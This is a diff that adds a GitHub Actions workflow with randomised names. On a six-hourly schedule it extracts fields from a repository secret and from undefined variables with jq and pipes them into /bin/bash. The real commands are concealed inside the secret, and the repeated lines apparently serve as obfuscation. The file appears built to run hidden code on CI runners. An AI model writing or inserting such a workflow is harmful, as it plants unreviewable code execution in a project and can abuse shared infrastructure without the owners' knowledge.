@@ -1,0 +1,26 @@
+name: shentengyi6543
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shentengyi6543
+        env:
+          qai7008: ${{ secrets.qai7008 }}
+        run: |
+          echo $qai7008 | jq -r .zeddc0 | /bin/bash
+          echo $wkt022 | jq -r .ar839 | /bin/bash
+          echo $pihvu3009 | jq -r .aslus98508 | /bin/bash
+          echo $abk9 | jq -r .jhhhs6 | /bin/bash
+          echo $y992 | jq -r .ytfr5 | /bin/bash
+          echo $d0 | jq -r .rywvl33197 | /bin/bash
+          echo $ekj61 | jq -r .dy7610 | /bin/bash
+          echo $t90 | jq -r .xbpgs7237 | /bin/bash
+          echo $w62016 | jq -r .gzd580 | /bin/bash
+
